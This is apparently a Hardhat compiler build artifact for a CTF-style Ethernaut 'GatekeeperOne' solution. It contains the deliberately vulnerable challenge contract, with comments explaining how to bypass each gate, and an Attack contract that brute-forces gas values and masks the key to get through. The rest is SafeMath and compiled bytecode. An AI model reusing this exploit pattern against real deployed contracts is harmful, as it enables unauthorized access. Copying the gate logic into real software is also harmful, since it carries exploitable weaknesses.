{
	"id": "dc9138aceb2933f3cc56496be739d7c9",
	"_format": "hh-sol-build-info-1",
	"solcVersion": "0.6.12",
	"solcLongVersion": "0.6.12+commit.27d51765",
	"input": {
		"language": "Solidity",
		"sources": {
			"contracts/13_Gatekeeper1.sol": {
				"content": "// SPDX-License-Identifier: MIT\npragma solidity ^0.6.0;\n\nimport \"@openzeppelin/contracts@v3.4.2/math/SafeMath.sol\";\n\ncontract GatekeeperOne {\n\n  using SafeMath for uint256;\n  address public entrant;\n\n    //exploit by call by contract\n  modifier gateOne() {\n    require(msg.sender != tx.origin);\n    _;\n  }\n    //exploit by brute force call target function\n    // {x + 8191*k}\n    //k => constant\n    //x => brute force value\n  modifier gateTwo() {\n    require(gasleft().mod(8191) == 0);\n    _;\n  }\n  //B0 B1 B2 B3 B4 B5 B6 B7 \n  modifier gateThree(bytes8 _gateKey) {\n      //B4 B5 B6 B7 == B6 B7\n      //00 00 B6 B7 == B6 B7\n      require(uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)), \"GatekeeperOne: invalid gateThree part one\");\n      //B4 B5 B6 B7 != B0 B1 B2 B3 B4 B5 B6 B7\n      //00 00 B6 B7 != B0 B1 B2 B3 00 00 B6 B7\n      require(uint32(uint64(_gateKey)) != uint64(_gateKey), \"GatekeeperOne: invalid gateThree part two\");\n      //B4 B5 B6 B7 == B6 B7\n      //00 00 B6 B7 == B6 B7(player last 2 Byte)\n      require(uint32(uint64(_gateKey)) == uint16(tx.origin), \"GatekeeperOne: invalid gateThree part three\");\n    _;\n  }\n\n  function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) {\n    entrant = tx.origin;\n    return true;\n  }\n}\n\ncontract Attack{\n    GatekeeperOne keeper;\n    constructor(GatekeeperOne _keeper)public {\n        keeper= _keeper;\n    }\n\n    function attack()public payable  {\n        bytes8 key = bytes8(uint64(msg.sender))& 0xFFFFFFFF0000FFFF;\n        for (uint256 i = 0; i < 300; i++) {\n            (bool success, ) = address(keeper).call{gas: i + (8191 * 3)}(abi.encodeWithSignature(\"enter(bytes8)\", key));\n            if (success) {\n                break;\n            }\n        }\n        \n    }\n   \n\n}"
			},
			"@openzeppelin/contracts@v3.4.2/math/SafeMath.sol": {
				"content": "// SPDX-License-Identifier: MIT\n\npragma solidity >=0.6.0 <0.8.0;\n\n/**\n * @dev Wrappers over Solidity's arithmetic operations with added overflow\n * checks.\n *\n * Arithmetic operations in Solidity wrap on overflow. This can easily result\n * in bugs, because programmers usually assume that an overflow raises an\n * error, which is the standard behavior in high level programming languages.\n * `SafeMath` restores this intuition by reverting the transaction when an\n * operation overflows.\n *\n * Using this library instead of the unchecked operations eliminates an entire\n * class of bugs, so it's recommended to use it always.\n */\nlibrary SafeMath {\n    /**\n     * @dev Returns the addition of two unsigned integers, with an overflow flag.\n     *\n     * _Available since v3.4._\n     */\n    function tryAdd(uint256 a, uint256 b) internal pure returns (bool, uint256) {\n        uint256 c = a + b;\n        if (c < a) return (false, 0);\n        return (true, c);\n    }\n\n    /**\n     * @dev Returns the substraction of two unsigned integers, with an overflow flag.\n     *\n     * _Available since v3.4._\n     */\n    function trySub(uint256 a, uint256 b) internal pure returns (bool, uint256) {\n        if (b > a) return (false, 0);\n        return (true, a - b);\n    }\n\n    /**\n     * @dev Returns the multiplication of two unsigned integers, with an overflow flag.\n     *\n     * _Available since v3.4._\n     */\n    function tryMul(uint256 a, uint256 b) internal pure returns (bool, uint256) {\n        // Gas optimization: this is cheaper than requiring 'a' not being zero, but the\n        // benefit is lost if 'b' is also tested.\n        // See: https://github.com/OpenZeppelin/openzeppelin-contracts/pull/522\n        if (a == 0) return (true, 0);\n        uint256 c = a * b;\n        if (c / a != b) return (false, 0);\n        return (true, c);\n    }\n\n    /**\n     * @dev Returns the division of two unsigned integers, with a division by zero flag.\n     *\n     * _Available since v3.4._\n     */\n    function tryDiv(uint256 a, uint256 b) internal pure returns (bool, uint256) {\n        if (b == 0) return (false, 0);\n        return (true, a / b);\n    }\n\n    /**\n     * @dev Returns the remainder of dividing two unsigned integers, with a division by zero flag.\n     *\n     * _Available since v3.4._\n     */\n    function tryMod(uint256 a, uint256 b) internal pure returns (bool, uint256) {\n        if (b == 0) return (false, 0);\n        return (true, a % b);\n    }\n\n    /**\n     * @dev Returns the addition of two unsigned integers, reverting on\n     * overflow.\n     *\n     * Counterpart to Solidity's `+` operator.\n     *\n     * Requirements:\n     *\n     * - Addition cannot overflow.\n     */\n    function add(uint256 a, uint256 b) internal pure returns (uint256) {\n        uint256 c = a + b;\n        require(c >= a, \"SafeMath: addition overflow\");\n        return c;\n    }\n\n    /**\n     * @dev Returns the subtraction of two unsigned integers, reverting on\n     * overflow (when the result is negative).\n     *\n     * Counterpart to Solidity's `-` operator.\n     *\n     * Requirements:\n     *\n     * - Subtraction cannot overflow.\n     */\n    function sub(uint256 a, uint256 b) internal pure returns (uint256) {\n        require(b <= a, \"SafeMath: subtraction overflow\");\n        return a - b;\n    }\n\n    /**\n     * @dev Returns the multiplication of two unsigned integers, reverting on\n     * overflow.\n     *\n     * Counterpart to Solidity's `*` operator.\n     *\n     * Requirements:\n     *\n     * - Multiplication cannot overflow.\n     */\n    function mul(uint256 a, uint256 b) internal pure returns (uint256) {\n        if (a == 0) return 0;\n        uint256 c = a * b;\n        require(c / a == b, \"SafeMath: multiplication overflow\");\n        return c;\n    }\n\n    /**\n     * @dev Returns the integer division of two unsigned integers, reverting on\n     * division by zero. The result is rounded towards zero.\n     *\n     * Counterpart to Solidity's `/` operator. Note: this function uses a\n     * `revert` opcode (which leaves remaining gas untouched) while Solidity\n     * uses an invalid opcode to revert (consuming all remaining gas).\n     *\n     * Requirements:\n     *\n     * - The divisor cannot be zero.\n     */\n    function div(uint256 a, uint256 b) internal pure returns (uint256) {\n        require(b > 0, \"SafeMath: division by zero\");\n        return a / b;\n    }\n\n    /**\n     * @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),\n     * reverting when dividing by zero.\n     *\n     * Counterpart to Solidity's `%` operator. This function uses a `revert`\n     * opcode (which leaves remaining gas untouched) while Solidity uses an\n     * invalid opcode to revert (consuming all remaining gas).\n     *\n     * Requirements:\n     *\n     * - The divisor cannot be zero.\n     */\n    function mod(uint256 a, uint256 b) internal pure returns (uint256) {\n        require(b > 0, \"SafeMath: modulo by zero\");\n        return a % b;\n    }\n\n    /**\n     * @dev Returns the subtraction of two unsigned integers, reverting with custom message on\n     * overflow (when the result is negative).\n     *\n     * CAUTION: This function is deprecated because it requires allocating memory for the error\n     * message unnecessarily. For custom revert reasons use {trySub}.\n     *\n     * Counterpart to Solidity's `-` operator.\n     *\n     * Requirements:\n     *\n     * - Subtraction cannot overflow.\n     */\n    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n        require(b <= a, errorMessage);\n        return a - b;\n    }\n\n    /**\n     * @dev Returns the integer division of two unsigned integers, reverting with custom message on\n     * division by zero. The result is rounded towards zero.\n     *\n     * CAUTION: This function is deprecated because it requires allocating memory for the error\n     * message unnecessarily. For custom revert reasons use {tryDiv}.\n     *\n     * Counterpart to Solidity's `/` operator. Note: this function uses a\n     * `revert` opcode (which leaves remaining gas untouched) while Solidity\n     * uses an invalid opcode to revert (consuming all remaining gas).\n     *\n     * Requirements:\n     *\n     * - The divisor cannot be zero.\n     */\n    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n        require(b > 0, errorMessage);\n        return a / b;\n    }\n\n    /**\n     * @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),\n     * reverting with custom message when dividing by zero.\n     *\n     * CAUTION: This function is deprecated because it requires allocating memory for the error\n     * message unnecessarily. For custom revert reasons use {tryMod}.\n     *\n     * Counterpart to Solidity's `%` operator. This function uses a `revert`\n     * opcode (which leaves remaining gas untouched) while Solidity uses an\n     * invalid opcode to revert (consuming all remaining gas).\n     *\n     * Requirements:\n     *\n     * - The divisor cannot be zero.\n     */\n    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n        require(b > 0, errorMessage);\n        return a % b;\n    }\n}\n"
			}
		},
		"settings": {
			"optimizer": {
				"enabled": false,
				"runs": 200
			},
			"outputSelection": {
				"*": {
					"": [
						"ast"
					],
					"*": [
						"abi",
						"metadata",
						"devdoc",
						"userdoc",
						"storageLayout",
						"evm.legacyAssembly",
						"evm.bytecode",
						"evm.deployedBytecode",
						"evm.methodIdentifiers",
						"evm.gasEstimates",
						"evm.assembly"
					]
				}
			}
		}
	},
	"output": {
		"contracts": {
			"@openzeppelin/contracts@v3.4.2/math/SafeMath.sol": {
				"SafeMath": {
					"abi": [],
					"devdoc": {
						"details": "Wrappers over Solidity's arithmetic operations with added overflow checks. Arithmetic operations in Solidity wrap on overflow. This can easily result in bugs, because programmers usually assume that an overflow raises an error, which is the standard behavior in high level programming languages. `SafeMath` restores this intuition by reverting the transaction when an operation overflows. Using this library instead of the unchecked operations eliminates an entire class of bugs, so it's recommended to use it always.",
						"kind": "dev",
						"methods": {},
						"version": 1
					},
					"evm": {
						"assembly": "    /* \"@openzeppelin/contracts@v3.4.2/math/SafeMath.sol\":630:7224  library SafeMath {... */\n  dataSize(sub_0)\n  dataOffset(sub_0)\n  0x0b\n  dup3\n  dup3\n  dup3\n  codecopy\n  dup1\n  mload\n  0x00\n  byte\n  0x73\n  eq\n  tag_1\n  jumpi\n  invalid\ntag_1:\n  mstore(0x00, address)\n  0x73\n  dup2\n  mstore8\n  dup3\n  dup2\n  return\nstop\n\nsub_0: assembly {\n        /* \"@openzeppelin/contracts@v3.4.2/math/SafeMath.sol\":630:7224  library SafeMath {... */\n      eq(address, deployTimeAddress())\n      mstore(0x40, 0x80)\n      0x00\n      dup1\n      revert\n\n    auxdata: 0xa26469706673582212209cd094374b5747291b5810f259237b2f6bd03c2158d099c5c9bc3c9c4483afa964736f6c634300060c0033\n}\n",
						"bytecode": {
							"linkReferences": {},
							"object": "60566023600b82828239805160001a607314601657fe5b30600052607381538281f3fe73000000000000000000000000000000000000000030146080604052600080fdfea26469706673582212209cd094374b5747291b5810f259237b2f6bd03c2158d099c5c9bc3c9c4483afa964736f6c634300060c0033",
							"opcodes": "PUSH1 0x56 PUSH1 0x23 PUSH1 0xB DUP3 DUP3 DUP3 CODECOPY DUP1 MLOAD PUSH1 0x0 BYTE PUSH1 0x73 EQ PUSH1 0x16 JUMPI INVALID JUMPDEST ADDRESS PUSH1 0x0 MSTORE PUSH1 0x73 DUP2 MSTORE8 DUP3 DUP2 RETURN INVALID PUSH20 0x0 ADDRESS EQ PUSH1 0x80 PUSH1 0x40 MSTORE PUSH1 0x0 DUP1 REVERT INVALID LOG2 PUSH5 0x6970667358 0x22 SLT KECCAK256 SWAP13 0xD0 SWAP5 CALLDATACOPY 0x4B JUMPI SELFBALANCE 0x29 SHL PC LT CALLCODE MSIZE 0x23 PUSH28 0x2F6BD03C2158D099C5C9BC3C9C4483AFA964736F6C634300060C0033 ",
							"sourceMap": "630:6594:0:-:0;;;;;;;;;;;;;;;;;;;;;;;;;"
						},
						"deployedBytecode": {
							"immutableReferences": {},
							"linkReferences": {},
							"object": "73000000000000000000000000000000000000000030146080604052600080fdfea26469706673582212209cd094374b5747291b5810f259237b2f6bd03c2158d099c5c9bc3c9c4483afa964736f6c634300060c0033",
							"opcodes": "PUSH20 0x0 ADDRESS EQ PUSH1 0x80 PUSH1 0x40 MSTORE PUSH1 0x0 DUP1 REVERT INVALID LOG2 PUSH5 0x6970667358 0x22 SLT KECCAK256 SWAP13 0xD0 SWAP5 CALLDATACOPY 0x4B JUMPI SELFBALANCE 0x29 SHL PC LT CALLCODE MSIZE 0x23 PUSH28 0x2F6BD03C2158D099C5C9BC3C9C4483AFA964736F6C634300060C0033 ",
							"sourceMap": "630:6594:0:-:0;;;;;;;;"
						},
						"gasEstimates": {
							"creation": {
								"codeDepositCost": "17200",
								"executionCost": "97",
								"totalCost": "17297"
							},
							"internal": {
								"add(uint256,uint256)": "infinite",
								"div(uint256,uint256)": "infinite",
								"div(uint256,uint256,string memory)": "infinite",
								"mod(uint256,uint256)": "infinite",
								"mod(uint256,uint256,string memory)": "infinite",
								"mul(uint256,uint256)": "infinite",
								"sub(uint256,uint256)": "infinite",
								"sub(uint256,uint256,string memory)": "infinite",
								"tryAdd(uint256,uint256)": "infinite",
								"tryDiv(uint256,uint256)": "infinite",
								"tryMod(uint256,uint256)": "infinite",
								"tryMul(uint256,uint256)": "infinite",
								"trySub(uint256,uint256)": "infinite"
							}
						},
						"legacyAssembly": {
							".code": [
								{
									"begin": 630,
									"end": 7224,
									"name": "PUSH #[$]",
									"source": 0,
									"value": "0000000000000000000000000000000000000000000000000000000000000000"
								},
								{
									"begin": 630,
									"end": 7224,
									"name": "PUSH [$]",
									"source": 0,
									"value": "0000000000000000000000000000000000000000000000000000000000000000"
								},
								{
									"begin": 630,
									"end": 7224,
									"name": "PUSH",
									"source": 0,
									"value": "B"
								},
								{
									"begin": 630,
									"end": 7224,
									"name": "DUP3",
									"source": 0
								},
								{
									"begin": 630,
									"end": 7224,
									"name": "DUP3",
									"source": 0
								},
								{
									"begin": 630,
									"end": 7224,
									"name": "DUP3",
									"source": 0
								},
								{
									"begin": 630,
									"end": 7224,
									"name": "CODECOPY",
									"source": 0
								},
								{
									"begin": 630,
									"end": 7224,
									"name": "DUP1",
									"source": 0
								},
								{
									"begin": 630,
									"end": 7224,
									"name": "MLOAD",
									"source": 0
								},
								{
									"begin": 630,
									"end": 7224,
									"name": "PUSH",
									"source": 0,
									"value": "0"
								},
								{
									"begin": 630,
									"end": 7224,
									"name": "BYTE",
									"source": 0
								},
								{
									"begin": 630,
									"end": 7224,
									"name": "PUSH",
									"source": 0,
									"value": "73"
								},
								{
									"begin": 630,
									"end": 7224,
									"name": "EQ",
									"source": 0
								},
								{
									"begin": 630,
									"end": 7224,
									"name": "PUSH [tag]",
									"source": 0,
									"value": "1"
								},
								{
									"begin": 630,
									"end": 7224,
									"name": "JUMPI",
									"source": 0
								},
								{
									"begin": 630,
									"end": 7224,
									"name": "INVALID",
									"source": 0
								},
								{
									"begin": 630,
									"end": 7224,
									"name": "tag",
									"source": 0,
									"value": "1"
								},
								{
									"begin": 630,
									"end": 7224,
									"name": "JUMPDEST",
									"source": 0
								},
								{
									"begin": 630,
									"end": 7224,
									"name": "ADDRESS",
									"source": 0
								},
								{
									"begin": 630,
									"end": 7224,
									"name": "PUSH",
									"source": 0,
									"value": "0"
								},
								{
									"begin": 630,
									"end": 7224,
									"name": "MSTORE",
									"source": 0
								},
								{
									"begin": 630,
									"end": 7224,
									"name": "PUSH",
									"source": 0,
									"value": "73"
								},
								{
									"begin": 630,
									"end": 7224,
									"name": "DUP2",
									"source": 0
								},
								{
									"begin": 630,
									"end": 7224,
									"name": "MSTORE8",
									"source": 0
								},
								{
									"begin": 630,
									"end": 7224,
									"name": "DUP3",
									"source": 0
								},
								{
									"begin": 630,
									"end": 7224,
									"name": "DUP2",
									"source": 0
								},
								{
									"begin": 630,
									"end": 7224,
									"name": "RETURN",
									"source": 0
								}
							],
							".data": {
								"0": {
									".auxdata": "a26469706673582212209cd094374b5747291b5810f259237b2f6bd03c2158d099c5c9bc3c9c4483afa964736f6c634300060c0033",
									".code": [
										{
											"begin": 630,
											"end": 7224,
											"name": "PUSHDEPLOYADDRESS",
											"source": 0
										},
										{
											"begin": 630,
											"end": 7224,
											"name": "ADDRESS",
											"source": 0
										},
										{
											"begin": 630,
											"end": 7224,
											"name": "EQ",
											"source": 0
										},
										{
											"begin": 630,
											"end": 7224,
											"name": "PUSH",
											"source": 0,
											"value": "80"
										},
										{
											"begin": 630,
											"end": 7224,
											"name": "PUSH",
											"source": 0,
											"value": "40"
										},
										{
											"begin": 630,
											"end": 7224,
											"name": "MSTORE",
											"source": 0
										},
										{
											"begin": 630,
											"end": 7224,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 630,
											"end": 7224,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 630,
											"end": 7224,
											"name": "REVERT",
											"source": 0
										}
									]
								}
							}
						},
						"methodIdentifiers": {}
					},
					"metadata": "{\"compiler\":{\"version\":\"0.6.12+commit.27d51765\"},\"language\":\"Solidity\",\"output\":{\"abi\":[],\"devdoc\":{\"details\":\"Wrappers over Solidity's arithmetic operations with added overflow checks. Arithmetic operations in Solidity wrap on overflow. This can easily result in bugs, because programmers usually assume that an overflow raises an error, which is the standard behavior in high level programming languages. `SafeMath` restores this intuition by reverting the transaction when an operation overflows. Using this library instead of the unchecked operations eliminates an entire class of bugs, so it's recommended to use it always.\",\"kind\":\"dev\",\"methods\":{},\"version\":1},\"userdoc\":{\"kind\":\"user\",\"methods\":{},\"version\":1}},\"settings\":{\"compilationTarget\":{\"@openzeppelin/contracts@v3.4.2/math/SafeMath.sol\":\"SafeMath\"},\"evmVersion\":\"istanbul\",\"libraries\":{},\"metadata\":{\"bytecodeHash\":\"ipfs\"},\"optimizer\":{\"enabled\":false,\"runs\":200},\"remappings\":[]},\"sources\":{\"@openzeppelin/contracts@v3.4.2/math/SafeMath.sol\":{\"keccak256\":\"0xcc78a17dd88fa5a2edc60c8489e2f405c0913b377216a5b26b35656b2d0dab52\",\"license\":\"MIT\",\"urls\":[\"bzz-raw://526dc85e1f9b9b45830e202568d267d93dde7a4fcccf4ad7798dadcd92304d3c\",\"dweb:/ipfs/QmaoXMB972J3cSDLtBq3xBo4jLwqD2uzXTwujtSPqkYVhR\"]}},\"version\":1}",
					"storageLayout": {
						"storage": [],
						"types": null
					},
					"userdoc": {
						"kind": "user",
						"methods": {},
						"version": 1
					}
				}
			},
			"contracts/13_Gatekeeper1.sol": {
				"Attack": {
					"abi": [
						{
							"inputs": [
								{
									"internalType": "contract GatekeeperOne",
									"name": "_keeper",
									"type": "address"
								}
							],
							"stateMutability": "nonpayable",
							"type": "constructor"
						},
						{
							"inputs": [],
							"name": "attack",
							"outputs": [],
							"stateMutability": "payable",
							"type": "function"
						}
					],
					"devdoc": {
						"kind": "dev",
						"methods": {},
						"version": 1
					},
					"evm": {
						"assembly": "    /* \"contracts/13_Gatekeeper1.sol\":1281:1771  contract Attack{... */\n  mstore(0x40, 0x80)\n    /* \"contracts/13_Gatekeeper1.sol\":1328:1401  constructor(GatekeeperOne _keeper)public {... */\n  callvalue\n  dup1\n  iszero\n  tag_1\n  jumpi\n  0x00\n  dup1\n  revert\ntag_1:\n  pop\n  mload(0x40)\n  sub(codesize, bytecodeSize)\n  dup1\n  bytecodeSize\n  dup4\n  codecopy\n  dup2\n  dup2\n  add\n  0x40\n  mstore\n  0x20\n  dup2\n  lt\n  iszero\n  tag_2\n  jumpi\n  0x00\n  dup1\n  revert\ntag_2:\n  dup2\n  add\n  swap1\n  dup1\n  dup1\n  mload\n  swap1\n  0x20\n  add\n  swap1\n  swap3\n  swap2\n  swap1\n  pop\n  pop\n  pop\n    /* \"contracts/13_Gatekeeper1.sol\":1387:1394  _keeper */\n  dup1\n    /* \"contracts/13_Gatekeeper1.sol\":1379:1385  keeper */\n  0x00\n  dup1\n    /* \"contracts/13_Gatekeeper1.sol\":1379:1394  keeper= _keeper */\n  0x0100\n  exp\n  dup2\n  sload\n  dup2\n  0xffffffffffffffffffffffffffffffffffffffff\n  mul\n  not\n  and\n  swap1\n  dup4\n  0xffffffffffffffffffffffffffffffffffffffff\n  and\n  mul\n  or\n  swap1\n  sstore\n  pop\n    /* \"contracts/13_Gatekeeper1.sol\":1328:1401  constructor(GatekeeperOne _keeper)public {... */\n  pop\n    /* \"contracts/13_Gatekeeper1.sol\":1281:1771  contract Attack{... */\n  dataSize(sub_0)\n  dup1\n  dataOffset(sub_0)\n  0x00\n  codecopy\n  0x00\n  return\nstop\n\nsub_0: assembly {\n        /* \"contracts/13_Gatekeeper1.sol\":1281:1771  contract Attack{... */\n      mstore(0x40, 0x80)\n      jumpi(tag_1, lt(calldatasize, 0x04))\n      shr(0xe0, calldataload(0x00))\n      dup1\n      0x9e5faafc\n      eq\n      tag_2\n      jumpi\n    tag_1:\n      0x00\n      dup1\n      revert\n        /* \"contracts/13_Gatekeeper1.sol\":1407:1764  function attack()public payable  {... */\n    tag_2:\n      tag_3\n      tag_4\n      jump\t// in\n    tag_3:\n      stop\n    tag_4:\n        /* \"contracts/13_Gatekeeper1.sol\":1450:1460  bytes8 key */\n      0x00\n        /* \"contracts/13_Gatekeeper1.sol\":1491:1509  0xFFFFFFFF0000FFFF */\n      0xffffffff0000ffff\n        /* \"contracts/13_Gatekeeper1.sol\":1463:1509  bytes8(uint64(msg.sender))& 0xFFFFFFFF0000FFFF */\n      0xc0\n      shl\n        /* \"contracts/13_Gatekeeper1.sol\":1477:1487  msg.sender */\n      caller\n        /* \"contracts/13_Gatekeeper1.sol\":1463:1489  bytes8(uint64(msg.sender)) */\n      0xc0\n      shl\n        /* \"contracts/13_Gatekeeper1.sol\":1463:1509  bytes8(uint64(msg.sender))& 0xFFFFFFFF0000FFFF */\n      and\n        /* \"contracts/13_Gatekeeper1.sol\":1450:1509  bytes8 key = bytes8(uint64(msg.sender))& 0xFFFFFFFF0000FFFF */\n      swap1\n      pop\n        /* \"contracts/13_Gatekeeper1.sol\":1524:1533  uint256 i */\n      0x00\n        /* \"contracts/13_Gatekeeper1.sol\":1519:1749  for (uint256 i = 0; i < 300; i++) {... */\n    tag_6:\n        /* \"contracts/13_Gatekeeper1.sol\":1543:1546  300 */\n      0x012c\n        /* \"contracts/13_Gatekeeper1.sol\":1539:1540  i */\n      dup2\n        /* \"contracts/13_Gatekeeper1.sol\":1539:1546  i < 300 */\n      lt\n        /* \"contracts/13_Gatekeeper1.sol\":1519:1749  for (uint256 i = 0; i < 300; i++) {... */\n      iszero\n      tag_7\n      jumpi\n        /* \"contracts/13_Gatekeeper1.sol\":1568:1580  bool success */\n      0x00\n        /* \"contracts/13_Gatekeeper1.sol\":1594:1600  keeper */\n      dup1\n      0x00\n      swap1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"contracts/13_Gatekeeper1.sol\":1586:1606  address(keeper).call */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"contracts/13_Gatekeeper1.sol\":1617:1625  8191 * 3 */\n      0x5ffd\n        /* \"contracts/13_Gatekeeper1.sol\":1612:1613  i */\n      dup4\n        /* \"contracts/13_Gatekeeper1.sol\":1612:1626  i + (8191 * 3) */\n      add\n        /* \"contracts/13_Gatekeeper1.sol\":1669:1672  key */\n      dup5\n        /* \"contracts/13_Gatekeeper1.sol\":1628:1673  abi.encodeWithSignature(\"enter(bytes8)\", key) */\n      add(0x24, mload(0x40))\n      dup1\n      dup3\n      not(0xffffffffffffffffffffffffffffffffffffffffffffffff)\n      and\n      dup2\n      mstore\n      0x20\n      add\n      swap2\n      pop\n      pop\n      mload(0x40)\n      0x20\n      dup2\n      dup4\n      sub\n      sub\n      dup2\n      mstore\n      swap1\n      0x40\n      mstore\n      and(not(0xffffffffffffffffffffffffffffffffffffffffffffffffffffffff), 0x3370204e00000000000000000000000000000000000000000000000000000000)\n      0x20\n      dup3\n      add\n      dup1\n      mload\n      0xffffffffffffffffffffffffffffffffffffffffffffffffffffffff\n      dup4\n      dup2\n      dup4\n      and\n      or\n      dup4\n      mstore\n      pop\n      pop\n      pop\n      pop\n        /* \"contracts/13_Gatekeeper1.sol\":1586:1674  address(keeper).call{gas: i + (8191 * 3)}(abi.encodeWithSignature(\"enter(bytes8)\", key)) */\n      mload(0x40)\n      dup1\n      dup3\n      dup1\n      mload\n      swap1\n      0x20\n      add\n      swap1\n      dup1\n      dup4\n      dup4\n    tag_9:\n      0x20\n      dup4\n      lt\n      tag_11\n      jumpi\n      dup1\n      mload\n      dup3\n      mstore\n      0x20\n      dup3\n      add\n      swap2\n      pop\n      0x20\n      dup2\n      add\n      swap1\n      pop\n      0x20\n      dup4\n      sub\n      swap3\n      pop\n      jump(tag_9)\n    tag_11:\n      0x01\n      dup4\n      0x20\n      sub\n      0x0100\n      exp\n      sub\n      dup1\n      not\n      dup3\n      mload\n      and\n      dup2\n      dup5\n      mload\n      and\n      dup1\n      dup3\n      or\n      dup6\n      mstore\n      pop\n      pop\n      pop\n      pop\n      pop\n      pop\n      swap1\n      pop\n      add\n      swap2\n      pop\n      pop\n      0x00\n      mload(0x40)\n      dup1\n      dup4\n      sub\n      dup2\n      0x00\n      dup8\n      dup8\n      call\n      swap3\n      pop\n      pop\n      pop\n      returndatasize\n      dup1\n      0x00\n      dup2\n      eq\n      tag_14\n      jumpi\n      mload(0x40)\n      swap2\n      pop\n      and(add(returndatasize, 0x3f), not(0x1f))\n      dup3\n      add\n      0x40\n      mstore\n      returndatasize\n      dup3\n      mstore\n      returndatasize\n      0x00\n      0x20\n      dup5\n      add\n      returndatacopy\n      jump(tag_13)\n    tag_14:\n      0x60\n      swap2\n      pop\n    tag_13:\n      pop\n        /* \"contracts/13_Gatekeeper1.sol\":1567:1674  (bool success, ) = address(keeper).call{gas: i + (8191 * 3)}(abi.encodeWithSignature(\"enter(bytes8)\", key)) */\n      pop\n      swap1\n      pop\n        /* \"contracts/13_Gatekeeper1.sol\":1692:1699  success */\n      dup1\n        /* \"contracts/13_Gatekeeper1.sol\":1688:1739  if (success) {... */\n      iszero\n      tag_15\n      jumpi\n        /* \"contracts/13_Gatekeeper1.sol\":1719:1724  break */\n      pop\n      jump(tag_7)\n        /* \"contracts/13_Gatekeeper1.sol\":1688:1739  if (success) {... */\n    tag_15:\n        /* \"contracts/13_Gatekeeper1.sol\":1519:1749  for (uint256 i = 0; i < 300; i++) {... */\n      pop\n        /* \"contracts/13_Gatekeeper1.sol\":1548:1551  i++ */\n      dup1\n      dup1\n      0x01\n      add\n      swap2\n      pop\n      pop\n        /* \"contracts/13_Gatekeeper1.sol\":1519:1749  for (uint256 i = 0; i < 300; i++) {... */\n      jump(tag_6)\n    tag_7:\n      pop\n        /* \"contracts/13_Gatekeeper1.sol\":1407:1764  function attack()public payable  {... */\n      pop\n      jump\t// out\n\n    auxdata: 0xa2646970667358221220c7c7bd7daa99e8436f9e8d72b4ef9c95c8ab6528ecbe48567bbee2635f0fab3a64736f6c634300060c0033\n}\n",
						"bytecode": {
							"linkReferences": {},
							"object": "608060405234801561001057600080fd5b506040516102be3803806102be8339818101604052602081101561003357600080fd5b8101908080519060200190929190505050806000806101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff1602179055505061022a806100946000396000f3fe60806040526004361061001e5760003560e01c80639e5faafc14610023575b600080fd5b61002b61002d565b005b600067ffffffff0000ffff60c01b3360c01b16905060005b61012c8110156101f05760008060009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16615ffd830184604051602401808277ffffffffffffffffffffffffffffffffffffffffffffffff191681526020019150506040516020818303038152906040527f3370204e000000000000000000000000000000000000000000000000000000007bffffffffffffffffffffffffffffffffffffffffffffffffffffffff19166020820180517bffffffffffffffffffffffffffffffffffffffffffffffffffffffff83818316178352505050506040518082805190602001908083835b6020831061016a5780518252602082019150602081019050602083039250610147565b6001836020036101000a03801982511681845116808217855250505050505090500191505060006040518083038160008787f1925050503d80600081146101cd576040519150601f19603f3d011682016040523d82523d6000602084013e6101d2565b606091505b5050905080156101e257506101f0565b508080600101915050610045565b505056fea2646970667358221220c7c7bd7daa99e8436f9e8d72b4ef9c95c8ab6528ecbe48567bbee2635f0fab3a64736f6c634300060c0033",
							"opcodes": "PUSH1 0x80 PUSH1 0x40 MSTORE CALLVALUE DUP1 ISZERO PUSH2 0x10 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x40 MLOAD PUSH2 0x2BE CODESIZE SUB DUP1 PUSH2 0x2BE DUP4 CODECOPY DUP2 DUP2 ADD PUSH1 0x40 MSTORE PUSH1 0x20 DUP2 LT ISZERO PUSH2 0x33 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST DUP2 ADD SWAP1 DUP1 DUP1 MLOAD SWAP1 PUSH1 0x20 ADD SWAP1 SWAP3 SWAP2 SWAP1 POP POP POP DUP1 PUSH1 0x0 DUP1 PUSH2 0x100 EXP DUP2 SLOAD DUP2 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF MUL NOT AND SWAP1 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND MUL OR SWAP1 SSTORE POP POP PUSH2 0x22A DUP1 PUSH2 0x94 PUSH1 0x0 CODECOPY PUSH1 0x0 RETURN INVALID PUSH1 0x80 PUSH1 0x40 MSTORE PUSH1 0x4 CALLDATASIZE LT PUSH2 0x1E JUMPI PUSH1 0x0 CALLDATALOAD PUSH1 0xE0 SHR DUP1 PUSH4 0x9E5FAAFC EQ PUSH2 0x23 JUMPI JUMPDEST PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH2 0x2B PUSH2 0x2D JUMP JUMPDEST STOP JUMPDEST PUSH1 0x0 PUSH8 0xFFFFFFFF0000FFFF PUSH1 0xC0 SHL CALLER PUSH1 0xC0 SHL AND SWAP1 POP PUSH1 0x0 JUMPDEST PUSH2 0x12C DUP2 LT ISZERO PUSH2 0x1F0 JUMPI PUSH1 0x0 DUP1 PUSH1 0x0 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 